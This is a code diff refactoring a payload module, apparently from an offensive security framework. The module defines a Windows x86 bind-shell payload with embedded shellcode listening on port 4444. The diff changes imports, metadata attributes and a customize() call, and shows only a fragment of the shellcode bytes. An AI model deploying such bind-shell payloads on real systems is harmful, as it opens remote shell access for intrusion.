@@ -1,10 +1,10 @@
 import typing
 from core import payloadcore
+from shells import shellsindex
 
 
 class BindWindowsx86(payloadcore.Payload):
 
-    PAYLOADREF: str = "bind/windows_x86"
     AUTHOR: str = "Danakane"
 
     def __init__(self):
@@ -37,11 +37,10 @@ class BindWindowsx86(payloadcore.Payload):
                      b"\xf0\xd8\x20\xb0\x96\xaf\xf4\x9d\x85\x8e\x64\x22"
 
         super(BindWindowsx86, self).__init__()
-        self.customize(BindWindowsx86.AUTHOR, BindWindowsx86.PAYLOADREF, payloadbin, "4444") # 4444 = bind port
+        self.customize(payloadbin, shellsindex.ShellsIndex.basicbind, "4444")  # 4444 = bind port
 
-    def parseparameters(self, host, port):
-        return self.binary()  # Nothing todo
+    def parseparameters(self, host: str, port: int) -> bytes:
+        return self.binary()
 
 
 blueprint: typing.Callable = BindWindowsx86
-name: str = BindWindowsx86.PAYLOADREF
